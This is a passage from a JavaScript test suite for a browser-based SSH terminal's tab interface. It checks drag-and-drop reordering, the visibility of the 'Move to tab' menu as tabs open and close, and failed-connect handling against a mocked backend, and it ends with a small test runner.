  m.move(lab, x0 + 30, y0);
  m.move($(win, 'tabs'), x0 + 80, y0 + 2);
  // Over its own pane's edge, then released there.
  const [ex, ey] = edgePoint(a.el, 'left');
  const into = a.el.querySelector('.pane-term') || a.el;
  m.move(into, ex, ey);
  await sleep(700);                       // past the spring delay
  const zone = win.document.querySelector('.drop-zone-left,.drop-zone-right,.drop-zone-top,.drop-zone-bottom');
  m.up(into, ex, ey);
  await sleep(30);
  mo.disconnect();
  ok(!look, 'the only tab, pressed and moved: no drag look at any moment (.tab.dragging / body.pane-moving)');
  ok(!zone, 'no drop zone shown on its own pane');
  ok($(win, 'tabs').innerHTML === strip0 || tabEls(win).length === 1, 'the strip is as it was');
  ok(show(shapesNow(win)) === shape0 && tabEls(win).length === 1, 'the layout is unchanged; got ' + show(shapesNow(win)));
  ok(noDragLeft(win), 'nothing left in a drag state');
  // The press is still a click: a following click on a pane button is
  // not swallowed (no "click after drag" block), and a double-click renames.
  // websh swallows the first click within 400 ms after a real drag.
  let got = false;
  const probe = () => { got = true; };
  lab.addEventListener('click', probe);
  lab.dispatchEvent(new win.MouseEvent('click', {bubbles: true, cancelable: true, button: 0}));
  lab.removeEventListener('click', probe);
  ok(got, 'the next click right after the press-and-move is not swallowed as a "click after a drag"');
  ok(needRename(env, tA), 'a double-click on the only tab still renames it');
  // Two tabs: the same gesture drags and reorders.
  const b = await tNewTab(win, 'b.host');
  if (!b) { ok(false, 'second tab'); cleanup(env); return; }
  await sleep(30);
  const tB = tabElOfPane(win, b);
  const m2 = pointer(win);
  const [bx, by] = centre(tB);
  const [ax] = centre(tA);
  m2.down(tB.querySelector('.tab-label'), bx, by);
  m2.move(tB.querySelector('.tab-label'), bx - 10, by);
  const dragging = !!win.document.querySelector('.tab.dragging');
  m2.move(tA.querySelector('.tab-label'), ax - (tA.getBoundingClientRect().width / 2) + 2, by);
  m2.up(tA.querySelector('.tab-label'), ax - (tA.getBoundingClientRect().width / 2) + 2, by);
  await sleep(30);
  ok(dragging, 'two tabs: the drag look is there');
  ok(tabEls(win)[0] === tB, 'two tabs: B dragged before A is now first; order ' + show(tabEls(win).map(t => tabLabel(t))));
  cleanup(env);
});

test('hide (break): a "Move to tab" menu open when the last other tab goes is closed, and the button is gone', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S4); const win = env.win;
  const a = await tConnect(win, 'a.host');
  const b = a && await tNewTab(win, 'b.host');
  if (!needTabs(win) || !b) { ok(false, 'setup'); cleanup(env); return; }
  await sleep(30);
  // b in front (lone): open its top-bar menu, then A closes by another path.
  press(win, toolBtn(win, 'move-to'));
  await until(() => targetItems(env).length >= 1, 300);
  ok(targetItems(env).length === 1, 'the menu lists A');
  win.closeTab(tabOfPane(a));
  await until(() => tabEls(win).length === 1, 500);
  await sleep(30);
  ok(openMenus(env).length === 0, 'A closed while the menu was open: the menu is gone (not left listing a dead tab or "No other tabs"); menus: ' + show(itemsShown(env).map(itemText)));
  noMoveAnywhere(env, 'after the other tab closed under an open menu');
  // The tab menu open when the other tab goes.
  const c = await tNewTab(win, 'c.host');
  if (!c) { ok(false, 'tab C'); cleanup(env); return; }
  await sleep(20);
  tabMenu(win, tabElOfPane(win, b));
  ok(!!intoItem(env), 'two tabs: "Move into tab" in B\'s menu');
  win.closeTab(tabOfPane(c));
  await until(() => tabEls(win).length === 1, 500);
  await sleep(20);
  ok(openMenus(env).length === 0, 'C closed while B\'s menu was open: the menu is gone');
  ok(!tabMenuHasInto(env, activeTab(win)).into, 'reopened: no "Move into tab"');
  cleanup(env);
});

test('hide (break): "+" then Escape (and a failed connect) creates no tab and never shows "Move to tab"', async () => {
  const plan = TAB_PLAN();
  // The third connect fails: c.host is refused.
  plan.splice(1, 0, {action: 'connect', match: bd => bd && bd.host === 'bad.host', response: {error: 'Authentication failed'}});
  const env = await mkTabEnv(plan, null, S4); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { ok(false, 'setup'); cleanup(env); return; }
  await sleep(30);
  let flick = [];
  const mt = toolBtn(win, 'move-to');
  const watch = () => { if (mt && !env.lay.hidden(mt)) flick.push(tabEls(win).length + ' tabs'); };
  const mo = new win.MutationObserver(watch);
  mo.observe(win.document.body, {attributes: true, subtree: true, childList: true});
  for (let i = 0; i < 3; i++) {
    press(win, $(win, 'tabNew'));
    await until(() => !hidden($(win, 'ov')), 500);
    watch();
    keyAt(win, 'Escape', 'Escape');
    await until(() => hidden($(win, 'ov')), 500);
  }
  // Alt+T from the terminal, Escape.
  typeIn(win, a, 'KeyT', 't', {alt: true});
  await until(() => !hidden($(win, 'ov')), 500);
  watch();
  keyAt(win, 'Escape', 'Escape');
  await until(() => hidden($(win, 'ov')), 500);
  // A connect that fails.
  press(win, $(win, 'tabNew'));
  await until(() => !hidden($(win, 'ov')), 500);
  $(win, 'iH').value = 'bad.host'; $(win, 'iU').value = 'u'; $(win, 'iPw').value = 'x';
  win.doConnect();
  await sleep(300);
  watch();
  mo.disconnect();
  ok(tabEls(win).length === 1, 'still one tab; got ' + tabEls(win).length);
  ok(flick.length === 0, '"Move to tab" was never shown while no second tab existed; seen with: ' + show(flick.slice(0, 5)));
  noMoveAnywhere(env, 'after "+"/Escape, Alt+T/Escape and a failed connect');
  if (!hidden($(win, 'ov'))) { keyAt(win, 'Escape', 'Escape'); win.cancelConnect && win.cancelConnect(); }
  cleanup(env);
});

test('hide (break): tabs opened and closed fast, by every path - the button always matches the tab count', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S4); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { ok(false, 'setup'); cleanup(env); return; }
  const bad = [];
  const check = (what) => {
    const n = tabEls(win).length;
    const shown = moveShown(env).length;
    const t = activeTab(win), ps = t ? panesOfTab(win, tabId(t)) : [];
    const want = n < 2 ? 0 : ps.length;      // lone: 1 in the top bar; split: one per bar
    if (shown !== want) bad.push(what + ': ' + n + ' tabs, ' + ps.length + ' panes in front, ' + shown + ' shown (want ' + want + ')');
    const into = tabMenuHasInto(env, t).into;
    if (into !== (n > 1)) bad.push(what + ': "Move into tab" ' + (into ? 'listed' : 'missing') + ' with ' + n + ' tabs');
  };
  const HOW = ['x', 'middle', 'closeTab', 'closePane', 'Alt+W'];
  let anchor = a;
  for (let i = 0; i < 10; i++) {
    const p = await tNewTab(win, 'n' + i + '.host');
    if (!p) { bad.push('round ' + i + ': no tab'); break; }
    check('round ' + i + ' opened');
    if (i % 3 === 1) { await tSplit(win, p, 'v', 's' + i + '.host'); check('round ' + i + ' split'); }
    // Even rounds close the old tab (from the new one in front), odd the new one (in front).
    const victim = i % 2 ? tabElOfPane(win, p) : tabElOfPane(win, anchor);
    const how = HOW[i % HOW.length];
    if (how === 'x') closeTabX(win, victim);
    else if (how === 'middle') middleClick(win, victim);
    else if (how === 'closeTab') win.closeTab(tabId(victim));
    else if (how === 'closePane') panesOfTab(win, tabId(victim)).forEach(q => win.closePane(q.id));
    else { if (activeTab(win) !== victim) { clickTab(win, victim); await until(() => activeTab(win) === victim, 300); }
           typeIn(win, panesOfTab(win, tabId(victim))[0], 'KeyW', 'w', {alt: true}); }
    await until(() => tabEls(win).length === 1, 500);
    check('round ' + i + ' closed by ' + how);
    anchor = paneList(win).find(q => tabOfPane(q) === tabId(tabEls(win)[0]));
    if (!anchor) { bad.push('round ' + i + ': no pane left'); break; }
  }
  ok(bad.length === 0, 'the button and the menu item followed the tab count at every step; wrong: ' + show(bad.slice(0, 6)));
  cleanup(env);
});

test('hide (break): a tab dragged onto a pane of the last other tab merges, and the button goes with it', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S4); const win = env.win;
  const a = await tConnect(win, 'a.host');
  const b = a && await tNewTab(win, 'b.host');
  if (!needTabs(win) || !b) { ok(false, 'setup'); cleanup(env); return; }
  clickTab(win, tabElOfPane(win, a));
  await until(() => tabOfPane(a) === tabId(activeTab(win)), 500);
  await sleep(30);
  ok(moveShown(env).length === 1, 'two tabs, A in front: "Move to tab" in the top bar');
  const m = grabTab(win, tabElOfPane(win, b));
  const release = overEdge(m, a, 'right');
  release();
  await until(() => tabEls(win).length === 1, 500);
  await sleep(30);
  ok(tabEls(win).length === 1 && panesOfTab(win, tabOfPane(a)).length === 2, 'B dragged onto A\'s right edge: one tab, two panes; got ' + show(shapesNow(win)));
  noMoveAnywhere(env, 'after the second-to-last tab was dragged into the last');
  ok(!tabMenuHasInto(env, activeTab(win)).into, 'no "Move into tab" in the menu');
  // And the merged-into tab can no longer be dragged (one tab).
  const tA = activeTab(win);
  const m2 = pointer(win); const [x, y] = centre(tA);
  m2.down(tA.querySelector('.tab-label'), x, y); m2.move(tA.querySelector('.tab-label'), x + 40, y);
  ok(!win.document.querySelector('.tab.dragging'), 'the now only tab shows no drag look');
  m2.up(tA.querySelector('.tab-label'), x + 40, y);
  cleanup(env);
});


// =====================================================================
// A stray rejection used to take node down mid-run with no summary, so
// a crash looked like "no result" rather than a failure. Count it as a
// failure against the scenario that was running and keep going.
let current = '(between scenarios)';
process.on('unhandledRejection', e => {
  failed++;
  failures.push(current + ': unhandled rejection: ' + (e && e.message || e));
  console.log('  UNHANDLED REJECTION: ' + (e && e.stack || e));
});
(async () => {
  for (const s of scenarios.filter(x => new RegExp(process.env.ONLY || '.').test(x.name))) {
    current = s.name;
    console.log('\n=== ' + s.name + ' ===');
    try { await s.fn(); } catch (e) {
      failed++;
      failures.push(s.name + ': ' + e.message);
      console.log('  THREW: ' + (e.stack || e.message));
    }
  }
  console.log('\n===========================================');
  console.log('  passed: ' + passed + '   failed: ' + failed);
  if (failed) {
    console.log('  failures:');
    failures.forEach(f => console.log('    - ' + f));
  }
  process.exit(failed ? 1 : 0);
})();
